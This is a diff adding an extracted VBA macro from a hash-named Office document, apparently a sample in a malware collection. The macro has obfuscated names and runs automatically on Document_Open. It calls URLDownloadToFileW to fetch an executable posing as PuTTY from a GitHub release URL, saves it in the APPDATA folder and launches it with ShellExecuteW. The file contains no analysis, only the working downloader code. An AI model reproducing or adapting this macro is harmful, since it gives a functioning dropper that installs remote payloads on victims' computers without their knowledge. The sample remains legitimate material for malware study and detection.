@@ -1,0 +1,26 @@
+Filename     : ./macros/e22c054f1a502d96b911c53dcf065315464799020a87c93a63d905cb76477a5a
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Option Explicit
+'Macro Name: yVxFFkPm
+Private Declare PtrSafe Function dRfaSFHd Lib "urlmon" Alias "URLDownloadToFileW" (ByVal IMNufayV As LongLong, ByVal BdDfVhNy As LongLong, ByVal gYlAiCFq As LongLong, ByVal LTTVvWxi As LongLong, ByVal qPBqIroa As LongLong) As LongLong
+Private Declare PtrSafe Function VKiLVMgR Lib "shell32.dll" Alias "ShellExecuteW" (ByVal ObZwMTvv As LongLong, ByVal tWHRZonn As LongLong, ByVal YRplmJee As LongLong, ByVal DNXGzeWW As LongLong, ByVal iIEbMzNO As LongLong, ByVal bZvMDGdr As LongLong) As LongLong
+Public Sub yVxFFkPm()
+Dim GUdhQbUj As String, mPLCdwMb As String
+GUdhQbUj = "https://github.com/putty-org-ru/PuTTY/releases/download/PuTTY-0.73-RU-17/putty.exe"
+mPLCdwMb = Environ("APPDATA") & "\Example.exe"
+Call dRfaSFHd(0, StrPtr(GUdhQbUj), StrPtr(mPLCdwMb), 0, 0)
+Call VKiLVMgR(0, StrPtr("Open"), StrPtr(mPLCdwMb), 0, 0, 1)
+End Sub
+Private Sub Document_Open()
+yVxFFkPm
+End Sub
